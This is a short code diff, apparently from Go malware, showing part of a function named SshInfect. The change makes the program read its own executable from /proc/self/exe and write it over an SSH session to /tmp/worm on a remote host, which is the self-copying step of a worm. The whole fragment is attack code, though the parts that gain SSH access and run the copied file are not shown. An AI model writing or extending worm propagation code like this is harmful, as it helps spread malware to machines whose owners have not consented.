@@ -34,7 +34,7 @@ func SshInfect(ip string) string {
 	}
 	defer session.Close()
 	var worm []byte
-	worm = GetSelf()
+	worm = GetFile("/proc/self/exe")
 	session.Stdin = bytes.NewReader(worm)
 	out,err := session.CombinedOutput("cat > /tmp/worm")
 	log.Printf("Command output: %q", out)
